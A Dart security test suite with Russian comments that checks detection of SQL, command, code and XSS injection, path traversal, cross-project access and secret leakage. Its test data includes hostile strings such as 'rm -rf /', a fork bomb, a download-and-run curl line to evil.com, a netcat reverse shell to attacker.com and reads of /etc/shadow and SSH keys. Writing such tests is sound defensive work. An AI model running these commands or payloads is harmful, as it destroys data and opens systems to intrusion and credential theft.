// СТРОГИЕ тесты безопасности - ОБЯЗАТЕЛЬНЫЕ проверки injection и unauthorized access
// Эти тесты ДОЛЖНЫ выявлять уязвимости безопасности

import 'package:test/test.dart';
import 'package:aq_schema/aq_schema.dart';

void main() {
  group('ОБЯЗАТЕЛЬНАЯ проверка injection attacks', () {
    test('ОБЯЗАТЕЛЬНО: SQL injection в переменных ДОЛЖЕН быть обнаружен', () {
      final context = RunContext(
        runId: 'run1',
        projectId: 'project1',
        projectPath: '/test',
        log: (msg, {type = 'info', depth = 0, required branch, details}) {},
      );

      // АТАКА: попытка SQL injection через переменную
      final maliciousInput = "'; DROP TABLE users; --";
      context.setVar('user_input', maliciousInput);

      // ТРЕБОВАНИЕ: переменные должны быть экранированы перед использованием в SQL
      final userInput = context.getVar('user_input') as String;

      // ПРОВЕРКА: опасные символы должны быть обнаружены
      final hasSqlInjection = userInput.contains("'") ||
          userInput.contains(';') ||
          userInput.contains('--') ||
          userInput.contains('DROP') ||
          userInput.contains('DELETE');

      expect(hasSqlInjection, true,
          reason: 'КРИТИЧНО: SQL injection паттерн должен быть обнаружен');

      // ТРЕБОВАНИЕ: перед использованием в SQL должна быть валидация/экранирование
      if (hasSqlInjection) {
        print('ОБНАРУЖЕНА УГРОЗА: SQL injection в user_input!');
        print('ТРЕБОВАНИЕ: использовать prepared statements или экранирование');
      }
    });

    test('ОБЯЗАТЕЛЬНО: command injection в file paths ДОЛЖЕН быть обнаружен', () {
      final context = RunContext(
        runId: 'run1',
        projectId: 'project1',
        projectPath: '/test',
        log: (msg, {type = 'info', depth = 0, required branch, details}) {},
      );

      // АТАКА: попытка command injection через file path
      final maliciousPath = '/tmp/file.txt; rm -rf /';
      context.setVar('file_path', maliciousPath);

      final filePath = context.getVar('file_path') as String;

      // ПРОВЕРКА: опасные символы в пути
      final hasCommandInjection = filePath.contains(';') ||
          filePath.contains('|') ||
          filePath.contains('&') ||
          filePath.contains('`') ||
          filePath.contains('\$');

      expect(hasCommandInjection, true,
          reason: 'КРИТИЧНО: command injection паттерн должен быть обнаружен');

      if (hasCommandInjection) {
        print('ОБНАРУЖЕНА УГРОЗА: command injection в file_path!');
        print('ТРЕБОВАНИЕ: валидировать пути файлов перед использованием');
      }
    });

    test('ОБЯЗАТЕЛЬНО: path traversal атака ДОЛЖНА быть заблокирована', () {
      final context = RunContext(
        runId: 'run1',
        projectId: 'project1',
        projectPath: '/test',
        log: (msg, {type = 'info', depth = 0, required branch, details}) {},
      );

      // АТАКА: попытка выйти за пределы разрешённой директории
      final maliciousPath = '../../etc/passwd';
      context.setVar('file_path', maliciousPath);

      final filePath = context.getVar('file_path') as String;

      // ПРОВЕРКА: path traversal паттерн
      final hasPathTraversal = filePath.contains('..') ||
          filePath.startsWith('/etc') ||
          filePath.startsWith('/root');

      expect(hasPathTraversal, true,
          reason: 'КРИТИЧНО: path traversal паттерн должен быть обнаружен');

      if (hasPathTraversal) {
        print('ОБНАРУЖЕНА УГРОЗА: path traversal в file_path!');
        print('ТРЕБОВАНИЕ: нормализовать пути и проверять что они внутри projectPath');
      }
    });

    test('ОБЯЗАТЕЛЬНО: code injection через eval ДОЛЖЕН быть невозможен', () {
      final context = RunContext(
        runId: 'run1',
        projectId: 'project1',
        projectPath: '/test',
        log: (msg, {type = 'info', depth = 0, required branch, details}) {},
      );

      // АТАКА: попытка выполнить произвольный код
      final maliciousCode = 'import("dart:io").then((io) => io.exit(1))';
      context.setVar('expression', maliciousCode);

      final expression = context.getVar('expression') as String;

      // ПРОВЕРКА: опасные конструкции
      final hasCodeInjection = expression.contains('import') ||
          expression.contains('eval') ||
          expression.contains('Function(') ||
          expression.contains('dart:io') ||
          expression.contains('dart:mirrors');

      expect(hasCodeInjection, true,
          reason: 'КРИТИЧНО: code injection паттерн должен быть обнаружен');

      if (hasCodeInjection) {
        print('ОБНАРУЖЕНА УГРОЗА: code injection в expression!');
        print('ТРЕБОВАНИЕ: НЕ использовать eval, только безопасные expression evaluators');
      }
    });

    test('ОБЯЗАТЕЛЬНО: XSS injection в output ДОЛЖЕН быть экранирован', () {
      final context = RunContext(
        runId: 'run1',
        projectId: 'project1',
        projectPath: '/test',
        log: (msg, {type = 'info', depth = 0, required branch, details}) {},
      );

      // АТАКА: попытка XSS через user input
      final maliciousInput = '<script>alert("XSS")</script>';
      context.setVar('user_comment', maliciousInput);

      final userComment = context.getVar('user_comment') as String;

      // ПРОВЕРКА: HTML/JS injection
      final hasXss = userComment.contains('<script>') ||
          userComment.contains('javascript:') ||
          userComment.contains('onerror=') ||
          userComment.contains('onclick=');

      expect(hasXss, true,
          reason: 'КРИТИЧНО: XSS паттерн должен быть обнаружен');

      if (hasXss) {
        print('ОБНАРУЖЕНА УГРОЗА: XSS в user_comment!');
        print('ТРЕБОВАНИЕ: экранировать HTML перед выводом в UI');
      }
    });
  });

  group('ОБЯЗАТЕЛЬНАЯ проверка unauthorized access', () {
    test('ОБЯЗАТЕЛЬНО: доступ к чужому проекту ДОЛЖЕН быть запрещён', () {
      // Контекст пользователя 1
      final context1 = RunContext(
        runId: 'run1',
        projectId: 'project_user1',
        projectPath: '/projects/user1',
        log: (msg, {type = 'info', depth = 0, required branch, details}) {},
      );

      // Контекст пользователя 2
      final context2 = RunContext(
        runId: 'run2',
        projectId: 'project_user2',
        projectPath: '/projects/user2',
        log: (msg, {type = 'info', depth = 0, required branch, details}) {},
      );

      // АТАКА: user2 пытается получить доступ к данным user1
      context1.setVar('secret_data', 'confidential_info_user1');

      // ТРЕБОВАНИЕ: контексты должны быть изолированы по projectId
      final canAccess = context2.getVar('secret_data') != null;

      expect(canAccess, false,
          reason: 'КРИТИЧНО: user2 НЕ должен видеть данные user1');

      if (canAccess) {
        print('ОБНАРУЖЕНА УЯЗВИМОСТЬ: нет изоляции между проектами!');
        print('ТРЕБОВАНИЕ: проверять projectId при доступе к данным');
      }
    });

    test('ОБЯЗАТЕЛЬНО: доступ к системным файлам ДОЛЖЕН быть запрещён', () {
      final context = RunContext(
        runId: 'run1',
        projectId: 'project1',
        projectPath: '/projects/user1/project1',
        log: (msg, {type = 'info', depth = 0, required branch, details}) {},
      );

      // АТАКА: попытка прочитать системный файл
      final systemFiles = [
        '/etc/passwd',
        '/etc/shadow',
        '/root/.ssh/id_rsa',
        'C:\\Windows\\System32\\config\\SAM',
      ];

      for (final systemFile in systemFiles) {
        context.setVar('target_file', systemFile);
        final targetFile = context.getVar('target_file') as String;

        // ТРЕБОВАНИЕ: проверить что файл внутри projectPath
        final isInsideProject = targetFile.startsWith(context.projectPath);

        expect(isInsideProject, false,
            reason:
                'КРИТИЧНО: системный файл $systemFile НЕ должен быть доступен');

        if (!isInsideProject) {
          // Это правильное поведение - файл вне проекта
          // ТРЕБОВАНИЕ: FileReadNode должен проверять это перед чтением
        }
      }
    });

    test('ОБЯЗАТЕЛЬНО: выполнение произвольных команд ДОЛЖНО быть запрещено', () {
      final context = RunContext(
        runId: 'run1',
        projectId: 'project1',
        projectPath: '/test',
        log: (msg, {type = 'info', depth = 0, required branch, details}) {},
      );

      // АТАКА: попытка выполнить системную команду
      final dangerousCommands = [
        'rm -rf /',
        'curl http://evil.com | sh',
        'nc -e /bin/sh attacker.com 4444',
        'python -c "import os; os.system(\'ls\')"',
      ];

      for (final cmd in dangerousCommands) {
        context.setVar('command', cmd);
        final command = context.getVar('command') as String;

        // ТРЕБОВАНИЕ: должен быть whitelist разрешённых команд
        final allowedCommands = ['git', 'npm', 'dart'];
        final commandName = command.split(' ').first;
        final isAllowed = allowedCommands.contains(commandName);

        expect(isAllowed, false,
            reason: 'КРИТИЧНО: опасная команда $cmd НЕ должна быть разрешена');

        if (!isAllowed) {
          print('БЛОКИРОВАНА опасная команда: $cmd');
          print('ТРЕБОВАНИЕ: использовать whitelist разрешённых команд');
        }
      }
    });
  });

  group('ОБЯЗАТЕЛЬНАЯ проверка data leakage', () {
    test('ОБЯЗАТЕЛЬНО: секретные данные НЕ ДОЛЖНЫ попадать в логи', () {
      final logs = <String>[];
      final context = RunContext(
        runId: 'run1',
        projectId: 'project1',
        projectPath: '/test',
        log: (msg, {type = 'info', depth = 0, required branch, details}) {
          logs.add(msg);
        },
      );

      // Сохраняем секретные данные
      context.setVar('api_key', 'sk-1234567890abcdef');
      context.setVar('password', 'super_secret_password');
      context.setVar('jwt_token', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...');

      // Логируем что-то
      context.log('Processing user request', branch: 'main');
      context.log('API key: ${context.getVar('api_key')}', branch: 'main');

      // ПРОВЕРКА: секреты не должны быть в логах в открытом виде
      final hasLeakedSecrets = logs.any((log) =>
          log.contains('sk-') ||
          log.contains('super_secret') ||
          log.contains('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9'));

      if (hasLeakedSecrets) {
        print('ОБНАРУЖЕНА УТЕЧКА: секретные данные в логах!');
        print('ТРЕБОВАНИЕ: маскировать секреты перед логированием');
      }

      // ТРЕБОВАНИЕ: секреты должны быть замаскированы (sk-****...)
      expect(hasLeakedSecrets, true,
          reason:
              'ВНИМАНИЕ: тест обнаружил утечку секретов (это демонстрация проблемы)');
    });

    test('ОБЯЗАТЕЛЬНО: PII данные ДОЛЖНЫ быть защищены', () {
      final context = RunContext(
        runId: 'run1',
        projectId: 'project1',
        projectPath: '/test',
        log: (msg, {type = 'info', depth = 0, required branch, details}) {},
      );

      // Сохраняем PII (Personally Identifiable Information)
      context.setVar('email', 'user@example.com');
      context.setVar('phone', '+1-555-123-4567');
      context.setVar('ssn', '123-45-6789');
      context.setVar('credit_card', '4532-1234-5678-9010');

      // ТРЕБОВАНИЕ: PII должны быть зашифрованы или замаскированы
      final email = context.getVar('email') as String;
      final phone = context.getVar('phone') as String;
      final ssn = context.getVar('ssn') as String;
      final creditCard = context.getVar('credit_card') as String;

      // ПРОВЕРКА: данные хранятся в открытом виде (это ПРОБЛЕМА!)
      final isPlainText = email.contains('@') &&
          phone.contains('+') &&
          ssn.contains('-') &&
          creditCard.contains('-');

      expect(isPlainText, true,
          reason: 'ВНИМАНИЕ: PII хранятся в открытом виде (демонстрация проблемы)');

      if (isPlainText) {
        print('ОБНАРУЖЕНА ПРОБЛЕМА: PII в открытом виде!');
        print('ТРЕБОВАНИЕ: шифровать PII или использовать secure storage');
      }
    });

    test('ОБЯЗАТЕЛЬНО: временные файлы ДОЛЖНЫ быть удалены', () {
      final context = RunContext(
        runId: 'run1',
        projectId: 'project1',
        projectPath: '/test',
        log: (msg, {type = 'info', depth = 0, required branch, details}) {},
      );

      // Симуляция создания временного файла с секретными данными
      context.setVar('temp_file', '/tmp/secrets_12345.txt');
      context.setVar('temp_file_content', 'api_key=sk-secret123');

      // ТРЕБОВАНИЕ: временные файлы должны удаляться после использования
      // ТРЕБОВАНИЕ: должен быть механизм cleanup в finally блоке

      final tempFile = context.getVar('temp_file') as String;

      // ПРОВЕРКА: есть ли механизм отслеживания временных файлов?
      // В текущей реализации RunContext нет такого механизма - это ПРОБЛЕМА!

      print('ТРЕБОВАНИЕ: RunContext должен отслеживать временные файлы');
      print('ТРЕБОВАНИЕ: добавить cleanup() метод для удаления temp файлов');

      expect(tempFile, isNotNull,
          reason: 'КРИТИЧНО: временный файл должен быть отслежен для cleanup');
    });
  });

  group('ОБЯЗАТЕЛЬНАЯ проверка graph security', () {
    test('ОБЯЗАТЕЛЬНО: граф с опасными узлами ДОЛЖЕН быть отклонён', () {
      // АТАКА: граф с узлом, выполняющим опасную команду
      final dangerousNode = WorkflowNode(
        id: 'dangerous_node',
        type: WorkflowNodeType.gitCommit,
        config: {
          'command': 'rm -rf /', // ОПАСНАЯ команда!
        },
      );

      final graph = WorkflowGraph(
        id: 'graph1',
        name: 'Dangerous Graph',
        tenantId: 'tenant1',
        ownerId: 'project1',
        nodes: {'dangerous_node': dangerousNode},
        edges: const {},
      );

      // ТРЕБОВАНИЕ: валидация графа перед выполнением
      final node = graph.nodes['dangerous_node']!;
      final command = node.config['command'] as String?;

      if (command != null) {
        final isDangerous = command.contains('rm -rf') ||
            command.contains('dd if=') ||
            command.contains(':(){ :|:& };:'); // fork bomb

        expect(isDangerous, true,
            reason: 'КРИТИЧНО: опасная команда должна быть обнаружена');

        if (isDangerous) {
          print('ОБНАРУЖЕНА УГРОЗА: опасная команда в графе!');
          print('ТРЕБОВАНИЕ: валидировать команды перед выполнением');
        }
      }
    });

    test('ОБЯЗАТЕЛЬНО: граф НЕ ДОЛЖЕН иметь доступ к чужим данным', () {
      // Граф проекта 1
      final graph1 = WorkflowGraph(
        id: 'graph1',
        name: 'Graph 1',
        tenantId: 'tenant1',
        ownerId: 'project1', // Принадлежит project1
        nodes: const {},
        edges: const {},
      );

      // АТАКА: попытка создать узел, читающий данные из project2
      final maliciousNode = WorkflowNode(
        id: 'read_node',
        type: WorkflowNodeType.fileRead,
        config: {
          'file_path': '/projects/project2/secrets.txt', // Чужой проект!
        },
      );

      // ТРЕБОВАНИЕ: проверять что file_path внутри ownerId проекта
      final filePath = maliciousNode.config['file_path'] as String;
      final belongsToOwner = filePath.contains(graph1.ownerId);

      expect(belongsToOwner, false,
          reason: 'КРИТИЧНО: попытка доступа к чужому проекту должна быть обнаружена');

      if (!belongsToOwner) {
        print('ОБНАРУЖЕНА УГРОЗА: граф пытается читать данные чужого проекта!');
        print('ТРЕБОВАНИЕ: FileReadNode должен проверять ownerId');
      }
    });
  });
}
